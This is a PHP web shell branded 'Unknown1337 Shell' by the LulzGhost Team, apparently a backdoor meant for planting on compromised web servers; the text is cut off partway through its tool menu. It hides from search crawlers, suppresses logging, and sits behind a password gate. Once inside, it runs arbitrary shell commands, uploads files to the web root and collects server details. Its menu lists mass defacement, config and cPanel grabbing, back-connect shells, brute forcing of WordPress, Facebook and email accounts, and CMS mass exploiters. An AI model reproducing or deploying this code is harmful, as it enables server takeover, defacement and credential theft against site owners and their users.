<?php
#####################################
#   Unknown1337                     #
#	Coded By Unknown1337			#
# 	bapakuheker@protonmail.com 		# 
# 	4ever only email :)				#
#   Security? that just an illucions#                 
# 	Lulz Ghost Team          		#                 
#####################################

session_start();
error_reporting(0);
set_time_limit(0);
if(version_compare(PHP_VERSION, '5.3.0', '<')) {
	@set_magic_quotes_runtime(0);
}
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
$color = "#00ff00";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

function login_shellbackdoor() {
?>
<html>
<head>
	<link rel="SHORTCUT ICON" href="https://k.top4top.io/p_22061rtwm7.png">
<title>xXx::.Unknown1337 Shell.::xXx/title>
<style type="text/css">
html {
	background: #000000;
	color: green;
}
header {
	color: green;
	margin: 10px auto;
}
input[type=password] {
	width: 250px;
	height: 25px;
	color: red;
	background: #000000;
	border: 1px solid #ffffff;
	padding: 5px;
	margin-left: 20px;
	text-align: center;
	transition: box-shadow 0.4s ease-out, border 0.4s ease-out;
	-webkit-transition: box-shadow 0.4s ease-out, border 0.4s ease-out;
	-moz-transition: box-shadow 0.4s ease-out, border 0.4s ease-out;
	-ms-transition: box-shadow 0.4s ease-out, border 0.4s ease-out;
}
input[type=password]:focus {
	box-shadow: 0px 0px 5px #cc0000, 0px 0px 15px #ff0000, 0px 0px 25px #ff0000, 0px 0px 35px #cc0000;
	border: 1px solid #ff0000;
}
</style>
</head>
<header>

<center>
<style type="text/css">
			#info-teja {
			z-index: 1000;
			background:-moz-linear-gradient(top,  #1F2326,  #555);
			background: -webkit-gradient(linear, left top, left bottom, from(#1F2326), to(#555));
			box-shadow:-2px -2px 8px #202020, 2px 2px 20px #202020;-moz-box-shadow:-2px -2px 8px #202020, 2px 2px 20px #202020;
		    -webkit-box-shadow:-2px -2px 8px #202020, 2px 2px 20px #202020;
			width:460px;
			position: fixed;
			top:150px;
			left:0;
			margin-left:-350px;
			border:1px solid #444;
			background-position:top right no-repeat;
			height:35px;font:11px Orbitron;
			color:#eee;
			border-top-right-radius:8px;
			border-bottom-right-radius:8px;
		    -moz-border-radius-topright:8px;
		    -moz-border-radius-bottomright:8px;
			-webkit-border-top-right-radius:8px;
			-webkit-border-bottom-right-radius:8px;
		}
	#info-teja{
	-o-transition: all 1s ease-in;
    -moz-transition: all 1s ease-in;
    -webkit-transition: all 1s ease-in;
	} 
	#info-teja:hover{
	width:400px;
	opacity:1.0;
	margin-left:0;
	}
	.Tejainbox {
	border:1px solid #444;
	width:320px; 
	margin:0px 90px 10px 10px;
	background:#000;
	color:#ffffff; 
	border-radius :20px; 
	padding:5px 0;
    -moz-border-radius:20px; 
    -webkit-border-radius:20px;
    -o-transition:all 2s ease-in;
    -moz-transition:all 2s ease-in;
    -webkit-transition:all 2s ease-in;
    opacity:0.2;
	}
	.Tejainbox:hover{
	opacity:1.0;
	box-shadow:1px 1px 15px #000; 
    -moz-box-shadow: 1px 1px 15px #000;
    -webkit-box-shadow: 1px 1px 15px #000;
	background: #000;
	}
	.Tejainbox2 {
	margin:5px 10px;
	padding:0px 8px 10px;
	color:#FFFFFF;
	overflow:hidden;
	height:370px;
	}
	.teja15 {
	border-radius:15px;
    -moz-border-radius:15px;
	-webkit-border-radius:15px;
	}
	.Teja2 ul.bom {
	margin: 0; 
	padding: 0;
	}
	.Tejainbox2 li {
	margin-left:20px;
	}
	.Tejainbox2 li a {
	color: #FFFFF; 
	line-height: 4px; 
	font-size: 11px;
	font-weight: bold;
	text-decoration:none;
	}
	.Tejainbox2 li a:hover {
	color: #428bca;
	text-shadow: 0 1px 1px #000;
	}
	.Tejainbox2 h2 { 
	font: 18px Droid Serif;
	font-weight:bold;
	padding:0 8px;
	color: #fffff;
	text-shadow: 0px 1px 1px #ddd;
	border-bottom: 1px solid #202020;
	}
	.Tejatouch {
	font-size:21px;
	font-weight:bold;
	font-family:Arial Narrow;
	float:right;
	margin: 3px 10px 0 0;
    -o-transition: all 0.5s ease-out;
    -moz-transition: all 0.5s ease-out;
    -webkit-transition: all 0.5s ease-out;
 	text-decoration:blink;
 	}
 .Tejatouch:hover{
    -o-transform: scale(2) rotate(720deg) translate(0px);
    -moz-transform: scale(2) rotate(720deg) translate(0px);
    -webkit-transform: scale(2) rotate(720deg) translate(0px);
    color: #fffff;
	}</style>	
<pre>
<script type="text/javascript">
TypingText = function(element, interval, cursor, finishedCallback) {
  if((typeof document.getElementById == "undefined") || (typeof element.innerHTML == "undefined")) {
    this.running = true;	// Never run.
    return;
  }
  this.element = element;
  this.finishedCallback = (finishedCallback ? finishedCallback : function() { return; });
  this.interval = (typeof interval == "undefined" ? 100 : interval);
  this.origText = this.element.innerHTML;
  this.unparsedOrigText = this.origText;
  this.cursor = (cursor ? cursor : "");
  this.currentText = "";
  this.currentChar = 0;
  this.element.typingText = this;
  if(this.element.id == "") this.element.id = "typingtext" + TypingText.currentIndex++;
  TypingText.all.push(this);
  this.running = false;
  this.inTag = false;
  this.tagBuffer = "";
  this.inHTMLEntity = false;
  this.HTMLEntityBuffer = "";
}
TypingText.all = new Array();
TypingText.currentIndex = 0;
TypingText.runAll = function() {
  for(var i = 0; i < TypingText.all.length; i++) TypingText.all[i].run();
}
TypingText.prototype.run = function() {
  if(this.running) return;
  if(typeof this.origText == "undefined") {
    setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);	// We haven't finished loading yet.  Have patience.
    return;
  }
  if(this.currentText == "") this.element.innerHTML = "";
//  this.origText = this.origText.replace(/<([^<])*>/, "");     // Strip HTML from text.
  if(this.currentChar < this.origText.length) {
    if(this.origText.charAt(this.currentChar) == "<" && !this.inTag) {
      this.tagBuffer = "<";
      this.inTag = true;
      this.currentChar++;
      this.run();
      return;
    } else if(this.origText.charAt(this.currentChar) == ">" && this.inTag) {
      this.tagBuffer += ">";
      this.inTag = false;
      this.currentText += this.tagBuffer;
      this.currentChar++;
      this.run();
      return;
    } else if(this.inTag) {
      this.tagBuffer += this.origText.charAt(this.currentChar);
      this.currentChar++;
      this.run();
      return;
    } else if(this.origText.charAt(this.currentChar) == "&" && !this.inHTMLEntity) {
      this.HTMLEntityBuffer = "&";
      this.inHTMLEntity = true;
      this.currentChar++;
      this.run();
      return;
    } else if(this.origText.charAt(this.currentChar) == ";" && this.inHTMLEntity) {
      this.HTMLEntityBuffer += ";";
      this.inHTMLEntity = false;
      this.currentText += this.HTMLEntityBuffer;
      this.currentChar++;
      this.run();
      return;
    } else if(this.inHTMLEntity) {
      this.HTMLEntityBuffer += this.origText.charAt(this.currentChar);
      this.currentChar++;
      this.run();
      return;
    } else {
      this.currentText += this.origText.charAt(this.currentChar);
    }
    this.element.innerHTML = this.currentText;
    this.element.innerHTML += (this.currentChar < this.origText.length - 1 ? (typeof this.cursor == "function" ? this.cursor(this.currentText) : this.cursor) : "");
    this.currentChar++;
    setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);
  } else {
	this.currentText = "";
	this.currentChar = 0;
        this.running = false;
        this.finishedCallback();
  }
}
</script>
</pre>
<div id="info-teja"><span class="Tejatouch" style="font-family:orbitron;font-size:18px">Credits:</span><div class="Tejainbox"><div class="Tejainbox2 teja15">
<h2><center> [+] We Are [+] </h2><br>
 
<center><div id="contenttengah"><center>
		<img title="Unknown1337"src="https://k.top4top.io/p_22061rtwm7.png" width="70%"></div> </center>


<span class="style4"> Shell Programmer: <br>Unknown1337</span><br><br>
<span class="style4">Unknown1337: <br>SQL47.ID</span><br><br>
<span class="style4">Official Member: <br>UnknownGho5t - Unknown7 - Unknown77 </span><br><br>
<span class="style4">Greetz : <br> AnonSec Team </span>
</div></div></div></td>
</div>

<?php 

$ServerName = $_SERVER['SERVER_NAME'];

?>
<style>
@import url(http://fonts.googleapis.com/css?family=Iceland);
</style>
<font color = "red" face = "Iceland" size = "6">Unknown1337 Bypass</font><br><br><br>
<font style="font: 15pt Verdana; color: red;">Welcome Hackers!!</font><br><br>
<table align="center" border="1" width="600" heigh>
<tbody><tr>
<td valign="top" background="http://dl.dropbox.com/u/10860051/images/matran."><p id="hack" style="margin-left: 3px;">
<font color="lime"> Please Wait . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font> <br>
<font color="#FFF000"> Searching For Available Users . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font><br>
<font color="#FFF000"> Users Found : <font color = 'red'>root@Unknown1337:~$ . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font></font><br>
<font color="lime"> Connecting To Our Master ^_^  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font><br>
<font color="#F00000"><font color="#FFF000">root@Unknown1337:~$</font> Connected ! </font><br>
<font color="lime"> Detecting The Server . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font><br>
<font color="lime"> Server Detected <font color="#FFF000"><?php echo $ServerName.": ~$" ?></font> . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font><br>
<font color="lime"> Trying To Connect To The Server . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font><br>
<font color="#F00000"><font color="#FFF000"><?php echo $ServerName.": ~$" ?></font> Connected ! </font><br>
<font color="#009900"><font color="#FFF000"><?php echo $ServerName.": ~$" ?></font><font color="lime"> Checking Server Command . . . . . . . . . . . . . . . . . . .</font> <br>

<font color="#009900"><font color="#FFF000"><?php echo $ServerName.": ~$" ?></font><font color="lime"> Trying connect to Command . . . . . . . . . . .</font><br>

<font color="#F00000"><font color="#FFF000"><?php echo $ServerName.": ~$" ?></font> Connected Command! </font><br>
<font color="red">root@Unknown1337:~$ </font><font color="#FFF000"><?php echo "@". $ServerName ?><br></font><font color="red">Ready To Fuck Server :p</font>
</tr>
</tbody></table>
<br>

<script type="text/javascript">
new TypingText(document.getElementById("hack"), 30, function(i){ var ar = new Array("_",""); return " " + ar[i.length % ar.length]; });
TypingText.runAll();

</script>


</pre>	

</center>
</header>
<form method="post">
<center><input type="password" name="pass"><center>
</form><br><br>
<font color = "red" face = "Verdana">Visit Us! : https://LulzGhost-Team.site </font>
<audio controls autoplay hidden>
				<source src="https://a.tumblr.com/tumblr_nc451eJAWg1tjcth4o1.mp3" type="audio/mpeg">
			</audio><br><br>
<font color = "red" face = "Verdana">@CopyRights LulzGhost Team2018 </font> 			
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shellbackdoor();
?>
<html>
<head>
	<link rel="SHORTCUT ICON" href="https://k.top4top.io/p_22061rtwm7.png">
<title>xXx::. Unknown1337 Shell .::xXxx</title>
<meta name='author' content='Unknown1337'>
<meta charset="UTF-8">
<style type='text/css'>
@import url(http://fonts.googleapis.com/css?family=Iceland);
@import url("https://fonts.googleapis.com/css?family=Rajdhani");
@import url(http://fonts.googleapis.com/css?family=Share+Tech+Mono);
hr {
 border:0;
 height:1px;
 background-image:linear-gradient(to right,rgba(0,0,0,0),rgb(255, 0, 0),rgba(0,0,0,0))
 }
html {
    background: #000000;
    color: #ffffff;
    font-family: 'Share Tech Mono';
	font-size: 13px;
	width: 100%;
}
li {
	display: inline;
	margin: 1px;
	padding: 1px;
}

 #menu a {
				padding:2px 10px;  
				margin:0; 
				background:#222222; 
				text-decoration:none; 
				letter-spacing:2px; 
				padding: 2px 10px;
				margin: 0;
				background: #222222;
				text-decoration: none;
				letter-spacing: 2px;
				border-radius: 2px;
				border-bottom: 2px solid #e11a1a;
				border-top: 2px solid #e11a1a;
				border-right: 2px solid #e11a1a;
				border-left: 2px solid #e11a1a;
       }
       #menu a:hover {
			background:#180000; 
			border-bottom:0px solid #333333; 
			border-top:0px solid #333333; 
       }
table tr:first-child{	
	background: black;
	text-align: center;
	color: red;
}
table, th, td {
	border-collapse:collapse;
	font-family: Tahoma, Geneva, sans-serif;
	background: transparent;
	font-family: 'Share Tech Mono';
	font-size: 13px;
}
.table_home, .th_home, .td_home {
	border: 0px solid red;
}
th {
	padding: 10px;
}
a {
	color: #ffffff;
	text-decoration: none;
}
a:hover {
	color: red;
	text-decoration: underline;
}
b {
	color: red;
}
input[type=text], input[type=password],input[type=submit] {
	background: transparent; 
	color: #ffffff; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Share Tech Mono';
	font-size: 13px;
}
input[type=submit] {
	background: transparent; 
	color: #ffffff; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Share Tech Mono';
	font-size: 13px;
	cursor:pointer;
}
textarea {
	border: 1px solid #ffffff;
	width: 100%;
	height: 400px;
	padding-left: 5px;
	margin: 10px auto;
	resize: none;
	background: transparent;
	color: #ffffff;
	font-family: 'Share Tech Mono';
	font-size: 13px;
}
select {
	width: 152px;
	background: #000000; 
	color: red; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Share Tech Mono';
	font-size: 13px;
}
option:hover {
	background: red;
	color: #000000;
}
.mybox{-moz-border-radius: 10px; border-radius: 10px;border:1px solid #ff0000; padding:4px 2px;width:70%;line-height:24px;background:none;box-shadow: 0px 4px 2px white;-webkit-box-shadow: 0px 4px 2px #ff0000;-moz-box-shadow: 0px 4px 2px #ff0000;}
.cgx2 {text-align: center;letter-spacing:1px;font-family: "orbitron";color: #ff0000;font-size:25px;text-shadow: 5px 5px 5px black;}
.infoweb {
	border-right: 1px solid #00FFFF;
}

</style>
<style type="text/css">
@-webkit-keyframes spinner {
  from {-webkit-transform: rotateY(0deg);}
  to {-webkit-transform: rotateY(-360deg);}
}

@-ms-keyframes spinner {
  from {-ms-transform: rotateY(0deg);}
  to {-ms-transform: rotateY(-360deg);}
}

@-o-keyframes spinner {
  from {-o-transform: rotateY(0deg);}
  to {-o-transform: rotateY(-360deg);}
}

@keyframes spinner {
  from {transform: rotateY(0deg);}
  to {transform: rotateY(-360deg);}
}

@-moz-keyframes spinner {
  from {-moz-transform: rotateY(0deg);}
  to {-moz-transform: rotateY(-360deg);}
}

#stage {
  margin: 1em auto;
  -webkit-perspective: 1200px;
  -moz-perspective: 1200px;
  -ms-perspective: 1200px;
  perspective: 1200px;
}
#spinner, #spinner p {
  text-align: center;
  color: #fff;
  -webkit-animation-name: spinner;
  -webkit-animation-timing-function: linear;
  -webkit-animation-iteration-count: infinite;
  -webkit-animation-duration: 6s;

  -moz-animation-name: spinner;
  -moz-animation-timing-function: linear;
  -moz-animation-iteration-count: infinite;
  -moz-animation-duration: 6s;

  animation-name: spinner;
  animation-timing-function: linear;
  animation-iteration-count: infinite;
  animation-duration: 6s;

  -webkit-transform-style: preserve-3d;
  -moz-transform-style: preserve-3d;
  -ms-transform-style: preserve-3d;
  transform-style: preserve-3d;
}
#spinner:hover {
  -webkit-animation-play-state: paused;
  -moz-animation-play-state: paused;
  animation-play-state: paused;
}
.tabnet{
	margin:15px auto 0 auto;
	border: 1px solid #333333;
}
.inputz{
	background:#111111;
	border:0;
	padding:2px;
	border-bottom:1px solid #222222;
	border-top:1px solid #222222;
}
.inputzbut{
	background:#111111;
	color:white;
	margin:0 4px;
	border:1px solid #444444;

}
.inputz:hover
	border-bottom:1px solid aqua;
	border-top:1px solid aqua;
	
}
.inputzbut:hover{
	border-bottom:1px solid aqua;
	border-top:1px solid aqua;
}
</style>
</head>
<?php

function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function r($dir,$perm) {
	if(!is_readable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function exe($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
function perms($file){
	$perms = fileperms($file);
	if (($perms & 0xC000) == 0xC000) {
	// Socket
	$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
	// Symbolic Link
	$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
	// Regular
	$info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
	// Block special
	$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
	// Directory
	$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
	// Character special
	$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
	// FIFO pipe
	$info = 'p';
	} else {
	// Unknown
	$info = 'u';
	}
		// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}
if(strtolower(substr($system,0,3)) == "win") $win = TRUE;
else $win = FALSE; 
// change directory
if(isset($_GET['y'])){
	if(@is_dir($_GET['view'])){
		$pwd = $_GET['view'];
		@chdir($pwd);
	}
	else{
		$pwd = $_GET['y'];
		@chdir($pwd);
	}
}

function hdd($s) {
	if($s >= 1073741824)
	return sprintf('%1.2f',$s / 1073741824 ).' GB';
	elseif($s >= 1048576)
	return sprintf('%1.2f',$s / 1048576 ) .' MB';
	elseif($s >= 1024)
	return sprintf('%1.2f',$s / 1024 ) .' KB';
	else
	return $s .' B';
}

function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
if(get_magic_quotes_gpc()) {
	function idx_ss($array) {
		return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
	}
	$_POST = idx_ss($_POST);
}

error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
if(version_compare(PHP_VERSION, '5.3.0', '<')) {
	@set_magic_quotes_runtime(0);
}
if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$freespace = hdd(disk_free_space("/"));
$total = hdd(disk_total_space("/"));
$used = $total - $freespace;
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=lime>OFF</font>";
$ds = @ini_get("disable_functions");
$open_basedir = @ini_get("Open_Basedir");
$safemode_exec_dir = @ini_get("safe_mode_exec_dir");
$safemode_include_dir = @ini_get("safe_mode_include_dir");

$mysql = (function_exists('mysql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$mssql = (function_exists('mssql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$pgsql = (function_exists('pg_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$magicquotes = (function_exists('get_magic_quotes_gpc')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$ssh2 = (function_exists('ssh2_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$oracle = (function_exists('oci_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>All Functions Is Accessible </font>";
$show_obdir = (!empty($open_basedir)) ? "<font color=red>OFF</font>" : "<font color=lime>ON</font>";
$show_exec = (!empty($safemode_exec_dir)) ? "<font color=red>OFF</font>" : "<font color=lime>ON</font>";
$show_include = (!empty($safemode_include_dir)) ? "<font color=red>OFF</font>" : "<font color=lime>ON</font>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
echo "<center>";
echo "<br>";
echo "<img src = 'https://k.top4top.io/p_22061rtwm7.png' width = '110' height = '110' id='spinner'></img>";
echo "&emsp;&emsp;&emsp;";
echo "<font size='20px' color='red' face = 'Rajdhani'>$ Unknown1337 Shell $</font>";
echo "&emsp;";
echo "<img src = 'https://k.top4top.io/p_22061rtwm7.png' width = '100' height = '100' id='spinner'></img>";
echo "<br><br>";
if($_POST['upload']) {
		if($_POST['tipe_upload'] == 'biasa') {
			if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
				$act = "<font color=lime>Uploaded!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
			} else {
				$act = "<font color=red>failed to upload file</font>";
			}
		} else {
			$root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['ix_file']['name'];
			$web = $_SERVER['HTTP_HOST']."/".$_FILES['ix_file']['name'];
			if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
				if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
					$act = "<font color=lime>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
				} else {
					$act = "<font color=red>failed to upload file</font>";
				}
			} else {
				$act = "<font color=red>failed to upload file</font>";
			}
		}
	}
	echo "
	<form method='post' enctype='multipart/form-data'>
	<input type='radio' name='tipe_upload' value='biasa' checked>Biasa [ ".w($dir,"Writeable")." ] 
	<input type='radio' name='tipe_upload' value='home_root'>home_root [ ".w($_SERVER['DOCUMENT_ROOT'],"Writeable")." ]<br>
	<input type='file' name='ix_file'>
	<input type='submit' value='upload' name='upload'>
	</form>";
	echo $act;
echo "<hr color='red'></font></center>";
echo "<pre>";
echo "Server IP 		: <font color = 'red'>".$_SERVER['SERVER_ADDR']. "</font> Your IP :<font color ='red'> ".$_SERVER['REMOTE_ADDR']."</font><br>";
echo "Software 		: <font color = 'lime'>".$_SERVER['SERVER_SOFTWARE']."</font><br>";
echo "Kernel Version 		: <font color = 'lime'>".php_uname()."</font><br>";
echo "Storage Space 		: <font color=lime>$used</font> / <font color=lime>$total</font> ( Free: <font color=lime>$freespace</font> )<br>";
echo "User / Group 		: <font color = 'lime'>".$user." (".$uid.") | ".$group." (".$gid.")</font><br>";
echo "Time On Server 		: <font color = 'lime'>".date("d M Y h:i:s a"). "</font><br>";
echo "Disable Functions 	: $show_ds<br>";
echo "Safe Mode 		: $sm<br>";
echo "PHP Version 		: <font color = 'lime'>".phpversion()." On ".php_sapi_name()."</font><br><br>";
echo "Open_Basedir: $show_obdir | Safe Mode Exec Dir: $show_exec | Safe Mode Include Dir: $show_include |  <br>";
echo "MySQL: $mysql | MSSQL: $mssql | PostgreSQL: $pgsql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl | Magic Quotes: $magicquotes | SSH2: $ssh2 | Oracle: $oracle |  <br>";

echo "</pre>";
echo "<form method='post'>
	<font color = 'red'>".$user."@".gethostbyname($_SERVER['HTTP_HOST']).": ~ $ </font>&nbsp;
	<input style='border: none; border-bottom: 1px solid #ffffff;' type='text' size='30' height='10' name='cmd'><input style='border: none; border-bottom: 1px solid #ffffff;' type='submit' name='do_cmd' value='>>'>
	</form>";
	if($_POST['do_cmd']) {
		echo "<pre>".exe($_POST['cmd'])."</pre>";
	}		
echo "</td></table>";
echo "<div id='menu'>";
echo "<hr color='red'>";
echo "<center>";
echo "<ul>";
echo "<li><a href='?' style = 'color:red';>Home</a></li>";
echo "<li> <a href='?dir=$dir&do=mass_deface'>Mass Tools</a> </li>";
echo "<li> <a href='?dir=$dir&do=config'>Config</a> </li>";
echo "<li> <a href='?dir=$dir&do=configv2'>Config V.2</a> </li>";
echo "<li> <a href='?dir=$dir&do=symlink'>Symlink</a></li>";
echo "<li> <a href='?dir=$dir&do=symlink2'>Symlink V.2</a> </li>";
echo "<li> <a href='?dir=$dir&do=symlink_python'>Symlink Python</a> </li>";
echo "<li> <a href='?dir=$dir&do=symconfig'>SymConfig</a> </li>";
echo "<li> <a href='?dir=$dir&do=adminer'>Adminer</a> </li> ";
echo "<li> <a href='?dir=$dir&do=grabcpanel'>Grab Cpanel</a> </li>";
echo "<li> <a href='?dir=$dir&do=cpanel'>CPanel Crack</a> </li><br><br>";
echo "<li> <a href='?dir=$dir&do=zoneh'>Zone-H</a> </li>";
echo "<li> <a href='?dir=$dir&do=defacerid'>Defacer.id</a> </li>";
echo "<li> <a href='?dir=$dir&do=multiconfig'>Multi Config</a> </li>";
echo "<li> <a href='?dir=$dir&do=cgi'>CGI Perl</a> </li>";
echo "<li> <a href='?dir=$dir&do=cgi2'>CGI Perl 2</a> </li>";
echo "<li> <a href='?dir=$dir&do=cgipy'>CGI Python</a> </li>";
echo "<li> <a href='?dir=$dir&do=network'>Back Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=backconnect'>Back Connect V.2</a> </li>";
echo "<li> <a href='?dir=$dir&do=jumping'>Jumping</a> </li>";
echo "<li> <a href='?dir=$dir&do=fake_root'>Fake Root</a> </li><br><br>";
echo "<li> <a href='?dir=$dir&do=auto_dwp'>Wp Auto Deface</a> </li>";
echo "<li> <a href='?dir=$dir&do=auto_dwp2'>Wp Auto Deface V.2</a> </li>";
echo "<li> <a href='?dir=$dir&do=auto_wp'>Wp Auto Edit Title</a> </li>";
echo "<li> <a href='?dir=$dir&do=hijack_wp'>Wp Auto Hijack</a> </li>";
echo "<li> <a href='?dir=$dir&do=jodexer'>Joomla Auto Deface</a></li>";
echo "<li> <a href='?dir=$dir&do=cpftp_auto'>Cpanel/Ftp Auto Deface</a></li>";
echo "<li> <a href='?dir=$dir&do=whois'>Whois</a></li><br><br>";
echo "<li> <a href='?dir=$dir&do=csrfup'>Csrf Exploiter</a></li>";
echo "<li> <a href='?dir=$dir&do=revslider'>RevSlider Mass Exploiter</a></li>";
echo "<li> <a href='?dir=$dir&do=elfinder'>Elfinder Mass Exploiter</a></li>";
echo "<li> <a href='?dir=$dir&do=lokomedia'>Lokomedia Mass Exploiter</a></li>";
echo "<li> <a href='?dir=$dir&do=drupal'>Drupal Mass Exploiter</a></li><br><br>";
echo "<li> <a href='?dir=$dir&do=ngindexx'>NginDexer</a> </li>";
echo "<li> <a href='?dir=$dir&do=vb'>VB Index Changer</a> </li>";
echo "<li> <a href='?dir=$dir&do=krdp_shell'>K-RDP Shell</a> </li>";
echo "<li> <a href='?dir=$dir&do=netsploit'>NetSploit</a> </li>";
echo "<li> <a href='?dir=$dir&do=smtp'>SMTP Grabber</a> </li>";
echo "<li> <a href='?dir=$dir&do=whmcsdecod'>WHMCS Decoder</a></li>";
echo "<li> <a href='?dir=$dir&do=dbdump'>DB Dump</a> </li>";
echo "<li> <a href='?dir=$dir&do=code'>Inject Code</a> </li><br><br>";
echo "<li> <a href='?dir=$dir&do=jbrute'>BruteForce Joomla</a></li>";
echo "<li> <a href='?dir=$dir&do=wpbrute'>BruteForce Wordpress</a></li>";
echo "<li> <a href='?dir=$dir&do=fb'>BruteForce Facebook</a></li>";
echo "<li> <a href='?dir=$dir&do=emailbrute'>BruteForce Email</a></li>";
echo "<li> <a href='?dir=$dir&do=twitterbf'>BruteForce Twitter</a></li><br><br>";
echo "<li> <a href='?dir=$dir&do=auto_edit_user'>Mass User Changer</a> </li>";
echo "<li> <a href='?dir=$dir&do=title'>Mass Title Changer</a> </li>";
echo "<li> <a href='?dir=$dir&do=sqli-scanner'>SQLi Scanner</a></li>";
echo "<li> <a href='?dir=$dir&do=ports'>Port Scanner</a></li>";
echo "<li> <a href='?dir=$dir&do=cmsvuln'>CMS Vulnerability Scanner</a></li><br><br>";
echo "<li> <a href='?dir=$dir&do=string'>Encode/Decode</a> </li>";
